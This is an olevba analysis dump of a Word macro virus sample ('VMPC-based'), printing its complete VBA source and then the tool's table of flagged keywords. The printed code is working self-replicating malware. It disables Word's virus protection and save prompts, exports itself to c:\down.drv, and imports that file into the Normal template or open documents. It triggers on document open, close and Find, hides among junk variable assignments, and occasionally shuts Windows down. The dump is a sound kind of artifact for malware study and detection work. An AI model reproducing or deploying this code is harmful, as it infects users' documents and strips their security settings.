olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-5a1485708bd222d99b4b90565ddd61d1aaa952c4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-5a1485708bd222d99b4b90565ddd61d1aaa952c4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO down.bas 
in file: Virus.MSWord.VMPC-based-5a1485708bd222d99b4b90565ddd61d1aaa952c4 - OLE stream: 'Macros/VBA/down'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub down()
On Error Resume Next
Randomize
PrUh5849 = QzBmItSr & QrHt10145 & Int(Rnd * 89)
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
VBE.ActiveVBProject.VBComponents("down").Export "c:\down.drv"
JeCkTnUz = SeAf10749 & SfKf6332
ActiveDocument.ReadOnlyRecommended = False
SuLw6411 = EmGrCsUu & DnJt3844 & Int(Rnd * 632)
GjEmIgSn = VjIg16419 & NqQk12493
FsNj15529 = LmGjLkRz & KqVh3656 & IuIuGyHw & GxGw12879
JtPu = Int(Rnd * 100)
If JtPu = 3 Then Call OjHj2171CrUv
UoCy5031 = EqQkHvSv & PiHx5314 & Int(Rnd * 1800)
QvMvNtLw = QwBz6612 & PfJs15000
If NormalTemplate.VBProject.VBComponents.Item("down").Name <> "down" Then JfSl35567165 = True
BkRm10995 = NeOsOqSo & DjNr11892 & Int(Rnd * 7407)
If ActiveDocument.VBProject.VBComponents.Item("down").Name <> "down" Then KwGf67164 = True
OoNm12294 = JrLlNqBo & OpNz16399 & Int(Rnd * 6576)
If JfSl35567165 = True And KwGf67164 = False Then Set EhEk67163555 = NormalTemplate.VBProject.VBComponents
If JfSl35567165 = False And KwGf67164 = True Then Set EhEk67163555 = ActiveDocument.VBProject.VBComponents
EhEk67163555.import "c:\down.drv"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If KwGf67164 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
UhTmMyFi = HlSs14736 & VuAt8811
KhDzNjJs:
End Sub
Sub EditFind()
    On Error Resume Next
Dialogs(wdDialogEditFind).Show
    Call down
VmEt5045 = CuHzRgQy & GgLh9240 & SeHvHlVj & RsBv4342
NgUz1057 = UzMfUzRz & OfCv7363 & Int(Rnd * 5272)
End Sub
Sub AutoOpen()
    On Error Resume Next
LxJoFgOo = NuKp11028 & UiOz8759
    Call down
InUpReGe = LvLg9642 & IvQn10169
End Sub
Sub AutoClose()
    On Error Resume Next
    Call down
PfGv9999 = GiEqSqNo & FpSz10063 & HhEyEpQw & VsSy11772
GgIkBxBh = NzCn7747 & BxSo17374
End Sub
Sub OjHj2171CrUv()
    On Error Resume Next
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Tasks.ExitWindows
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|5Vqe                |35567165                                     |
+----------+--------------------+---------------------------------------------+
